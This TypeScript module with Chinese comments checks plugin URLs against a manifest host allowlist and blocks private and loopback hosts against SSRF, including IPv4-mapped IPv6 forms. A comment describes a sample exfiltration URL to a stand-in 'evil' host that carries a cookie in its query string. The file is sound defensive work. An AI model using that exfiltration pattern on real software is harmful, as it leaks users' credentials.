/**
 * manifest hosts 域名白名单匹配（PROTOCOL §2 / §8）。
 *
 * 纯函数、无 DOM / Node 依赖：宿主（hostFetch / PluginHost）与 Vite 开发代理
 * 中间件（vite.config.ts）共用同一份规则，不会出现两边判得不一致。
 *
 * 规则：
 * - 只匹配 hostname，端口不参与（manifest 列的是域名不是服务端口）；
 * - hostname 大小写不敏感（DNS 本身如此，URL 解析已归一化为小写，双保险）；
 * - `*.example.com` 通配**一级**子域：a.example.com 匹配，example.com 不匹配，
 *   a.b.example.com 不匹配；
 * - 非 http(s) 协议一律拒绝；
 * - 私网 / 回环 / 链路本地主机一律拒绝（SSRF 防线：即使 manifest 写了
 *   localhost 也不放行——插件音源全部是公网 API，本地测试走 Mock 插件的数据 URL）。
 */

/** 私网与本地主机段（按 hostname 字面判定，不解析 DNS） */
const PRIVATE_HOST_PATTERNS: RegExp[] = [
  // `localhost` 与它的任意子域：`api.localhost`、`x.y.localhost` 在
  // 现代浏览器与多数 resolver 上同样解析到回环，只钉裸名会漏掉整片
  /(^|\.)localhost$/i,
  /^127\./,
  /^10\./,
  /^192\.168\./,
  /^172\.(1[6-9]|2\d|3[01])\./,
  /^169\.254\./,
  // CGNAT（100.64.0.0/10）：运营商级内网，也是不少路由器/NAS 的实际网段
  /^100\.(6[4-9]|[7-9]\d|1[01]\d|12[0-7])\./,
  /^0\./,
  /^\[?::1\]?$/,
  // 未指定地址 `::`：连过去等于本机
  /^\[?::\]?$/,
  /^\[?fe80:/i,
  // ULA 是 fc00::/7 —— 只写 fc 会放过实际最常用的 fd00::/8
  /^\[?f[cd][0-9a-f]{2}:/i,
  /\.local$/i,
  /\.internal$/i,
]

/**
 * IPv4-mapped IPv6（`::ffff:127.0.0.1`，URL 解析器会归一化成十六进制形态
 * `[::ffff:7f00:1]`）：取出内嵌的 v4 地址，再按 v4 规则判一次。
 * 不还原就等于给「用 v6 语法写内网 v4 地址」开了一条整路。
 */
function mappedIPv4(hostname: string): string | null {
  const bare = hostname.replace(/^\[/, '').replace(/\]$/, '')
  const m = /^(?:::ffff:|0{1,4}(?::0{1,4}){0,4}:ffff:)(.+)$/i.exec(bare)
  if (!m) return null
  const tail = m[1]
  // 点分形态：::ffff:127.0.0.1
  if (/^\d{1,3}(\.\d{1,3}){3}$/.test(tail)) return tail
  // 十六进制形态：::ffff:7f00:1 —— 两组 16 位拼成 32 位再拆成点分
  const hex = /^([0-9a-f]{1,4}):([0-9a-f]{1,4})$/i.exec(tail)
  if (!hex) return null
  const high = parseInt(hex[1], 16)
  const low = parseInt(hex[2], 16)
  return [high >> 8, high & 0xff, low >> 8, low & 0xff].join('.')
}

export function isPrivateHost(hostname: string): boolean {
  if (PRIVATE_HOST_PATTERNS.some(re => re.test(hostname))) return true
  const mapped = mappedIPv4(hostname)
  return mapped !== null && PRIVATE_HOST_PATTERNS.some(re => re.test(mapped))
}

export function isHostAllowed(rawUrl: string, hosts: readonly string[]): boolean {
  let parsed: URL
  try {
    parsed = new URL(rawUrl)
  } catch {
    return false
  }
  if (parsed.protocol !== 'https:' && parsed.protocol !== 'http:') return false
  const hostname = parsed.hostname.toLowerCase().replace(/\.$/, '')
  if (isPrivateHost(hostname)) return false

  return hosts.some(pattern => {
    const p = pattern.trim().toLowerCase().replace(/\.$/, '')
    if (!p) return false
    if (p.startsWith('*.')) {
      const base = p.slice(2)
      // 一级子域：hostname 去掉最后一段 base 后必须恰好剩一段
      if (hostname.endsWith('.' + base)) {
        const head = hostname.slice(0, -(base.length + 1))
        return head.length > 0 && !head.includes('.')
      }
      return false
    }
    return hostname === p
  })
}

/**
 * 插件返回、要交给**主窗口**加载的地址（封面 `<img>`、流 `<audio>`、二维码图）
 * 的准入判定。
 *
 * 为什么非判不可：这些地址不经宿主通道，是主窗口自己发的请求——沙箱 CSP
 * 管不到，白名单也就此失效。恶意插件把 `env.credentials` 拼进封面地址的
 * query（`https://evil/c.jpg?c=<cookie>`），主窗口一渲染就把凭据送出了设备。
 * 所以这里的规则与 hostFetch 入口同一条：http(s) + manifest hosts 白名单
 * + 私网拒绝，`javascript:` / `file:` 一类协议一律不认。
 *
 * allowDataMedia：额外放行 `data:image|audio|video/*`。data: 不出网、不带
 * 目的地，没有外泄面；二维码图（本地 QRCode 生成）与 Mock 插件的内存 WAV
 * 流地址都是这个形状。注意封面**不**开这一档：封面会随歌曲写进听歌历史落盘，
 * 放任几 MB 的 data: 串进去会把存储撑爆——封面只开 `allowSmallDataImage`，
 * 几 KB 以内的内联小图（占位 SVG 那种）放行，其余照旧只认白名单内的 http(s)。
 */
export function safeResourceUrl(
  raw: unknown,
  hosts: readonly string[],
  options?: { allowDataMedia?: boolean; allowSmallDataImage?: boolean },
): string | null {
  if (typeof raw !== 'string') return null
  const url = raw.trim()
  if (!url) return null
  if (options?.allowDataMedia && /^data:(image|audio|video)\/[a-z0-9.+-]+[;,]/i.test(url)) return url
  if (options?.allowSmallDataImage && url.length <= SMALL_DATA_IMAGE_MAX_CHARS && /^data:image\/[a-z0-9.+-]+[;,]/i.test(url)) return url
  return isHostAllowed(url, hosts) ? url : null
}

/**
 * 封面允许的内联 data:image 上限。几 KB 装得下一个占位 SVG（离线的 Mock 音源
 * 就靠它出封面），装不下一张真照片——真照片才是撑爆听歌历史存储的那种东西。
 */
export const SMALL_DATA_IMAGE_MAX_CHARS = 8 * 1024
